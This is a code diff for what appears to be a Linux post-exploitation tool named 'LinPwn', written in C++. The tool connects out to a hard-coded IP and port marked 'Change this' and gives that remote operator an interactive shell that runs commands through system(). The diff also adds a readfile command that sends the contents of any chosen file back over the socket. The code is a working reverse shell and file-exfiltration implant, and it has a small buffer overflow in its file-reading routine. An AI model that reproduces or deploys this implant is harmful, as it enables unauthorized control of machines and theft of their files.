@@ -9,12 +9,12 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 
+
 #define BUFFER 20
 #define SD 0
 
 
 void get_input(char *option) {
-  write(SD, "\x1b[31m>>> \0", 10);
   fgets(option, 20, stdin);
 
   for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
@@ -26,8 +26,8 @@ void get_input(char *option) {
 
 
 class Connection {
-  const char *ip = "192.168.1.165";
-  const int port = 8000;
+  const char *ip = "192.168.1.165";  // Change this
+  const int port = 8000;  // Change this
   struct sockaddr_in address;
 
  public:
@@ -43,17 +43,70 @@ class Connection {
 };
 
 
-struct Commands {
+class Commands {
+  void open_file(char *option) {
+    FILE *file = fopen(option, "rb");
+
+    if (!file) {
+      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
+      return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    int size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    char *filecontent = new char[size];
+
+    fread(filecontent, 1, size, file);
+    filecontent[size] = '\0';
+    send(SD, filecontent, size, 0);
+    fclose(file);
+    delete[] filecontent;
+  }
+
+
+ public:
   void help() {
     write(SD, "\x1b[32mOptions: \n\0", 15);
     write(SD, "1. shell\n\0", 10);
-    write(SD, "2. exit\n\0", 10);
+    write(SD, "2. readfile\n\0", 14);
+    write(SD, "3. exit\n\0", 10);
   }
 
 
   void shell() {
+    char option[BUFFER];
     write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
-    system("/bin/sh");
+    write(SD, "Type exit to return to LinPwn.\n\0", 33);
+
+    for (;;) {
+      write(SD, "\x1b[31mShell> \0", 11);
+      write(SD, "\x1b[32m \0", 8);
+      get_input(option);
+
+      if (strncmp(option, "exit\0", 5) == 0) break;
+      else
+        system(option);
+    }
+  }
+
+
+  void read_file() {
+    char option[BUFFER];
+    write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
+    write(SD, "Type exit to return to LinPwn.\n\0", 33);
+
+    for (;;) {
+      write(SD, "\x1b[31mReadFile> \0", 14);
+      write(SD, "\x1b[32m \0", 8);
+      get_input(option);
+
+      if (strncmp(option, "exit\0", 5) == 0) {
+        break;
+      } else {
+        open_file(option);
+      }
+    }
   }
 
 
@@ -68,11 +121,13 @@ int handler() {
   char option[BUFFER];
   get_input(option);
 
-  if (strncmp(option, "shell", 5) == 0) {
+  if (strncmp(option, "shell\0", 6) == 0) {
     commands.shell();
-  } else if (strncmp(option, "help", 4) == 0) {
+  } else if (strncmp(option, "readfile\0", 9) == 0) {
+    commands.read_file();
+  } else if (strncmp(option, "help\0", 8) == 0) {
     commands.help();
-  } else if (strncmp(option, "exit", 4) == 0) {
+  } else if (strncmp(option, "exit\0", 5) == 0) {
     commands.quit();
     return 1;
   } else if (strncmp(option, "", 1) == 0) {
@@ -93,6 +148,7 @@ int main() {
   write(SD, "Type help to list commands.\n\0", 28);
 
   for (;;) {
+    write(SD, "\x1b[31m>>> \0", 10);
     if (handler() == 1) break;
   }
 
